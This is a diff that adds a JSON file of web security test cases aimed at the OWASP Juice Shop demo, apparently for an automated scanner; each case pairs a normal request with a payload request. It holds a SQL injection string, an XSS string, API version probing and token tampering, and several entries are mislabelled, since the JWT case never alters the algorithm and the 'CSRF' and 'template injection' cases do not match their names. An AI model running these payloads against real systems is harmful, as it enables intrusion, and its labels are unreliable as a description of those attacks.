@@ -1,0 +1,99 @@
+[
+  {
+    "attack_vector": "jwt_algorithm_confusion",
+    "test_scenario": "Attempts to manipulate JWT algorithm by modifying the 'alg' claim to exploit vulnerable algorithms.",
+    "baseline_request": {
+      "method": "POST",
+      "url": "https://demo.owasp-juice.shop/api/login",
+      "headers": {
+        "Content-Type": "application/json",
+        "Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9"
+      },
+      "params": {},
+      "body": "{\"username\": \"admin\", \"password\": \"password\"}"
+    },
+    "payload_request": {
+      "method": "POST",
+      "url": "https://demo.owasp-juice.shop/api/login",
+      "headers": {
+        "Content-Type": "application/json",
+        "Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"
+      },
+      "params": {},
+      "body": "{\"username\": \"admin\", \"password\": \"password\"}"
+    }
+  },
+  {
+    "attack_vector": "sql_injection_post_param",
+    "test_scenario": "Injects SQL payload into POST body parameter to test for SQLi.",
+    "baseline_request": {
+      "method": "POST",
+      "url": "https://demo.owasp-juice.shop/api/search",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "params": {},
+      "body": "{\"query\": \"apple\"}"
+    },
+    "payload_request": {
+      "method": "POST",
+      "url": "https://demo.owasp-juice.shop/api/search",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "params": {},
+      "body": "{\"query\": \"apple' UNION ALL SELECT * FROM users WHERE id = 1 --\"}"
+    }
+  },
+  {
+    "attack_vector": "api_versioning",
+    "test_scenario": "Attempts to identify and probe unintended API endpoints by enumerating version numbers.",
+    "baseline_request": {
+      "method": "GET",
+      "url": "https://demo.owasp-juice.shop/api/v1/users",
+      "headers": {}
+    },
+    "payload_request": {
+      "method": "GET",
+      "url": "https://demo.owasp-juice.shop/api/v2/users",
+      "headers": {}
+    }
+  },
+  {
+    "attack_vector": "template_injection",
+    "test_scenario": "Inserts malicious data into a template to potentially execute code or manipulate output.",
+    "baseline_request": {
+      "method": "GET",
+      "url": "https://demo.owasp-juice.shop/search?q=apple",
+      "headers": {}
+    },
+    "payload_request": {
+      "method": "GET",
+      "url": "https://demo.owasp-juice.shop/search?q={{javascript:alert('XSS')}}",
+      "headers": {}
+    }
+  },
+  {
+    "attack_vector": "csrf",
+    "test_scenario": "Performs CSRF attack by manipulating user's browser to perform unintended actions.",
+    "baseline_request": {
+      "method": "POST",
+      "url": "https://demo.owasp-juice.shop/api/payment",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "params": {},
+      "body": "{\"amount\": 100}"
+    },
+    "payload_request": {
+      "method": "POST",
+      "url": "https://demo.owasp-juice.shop/user",
+      "headers": {
+        "Content-Type": "application/json",
+        "Cookie": "_csrf=abc123"
+      },
+      "params": {},
+      "body": "{ \"action\": \"pay\", \"amount\": 100 }"
+    }
+  }
+]
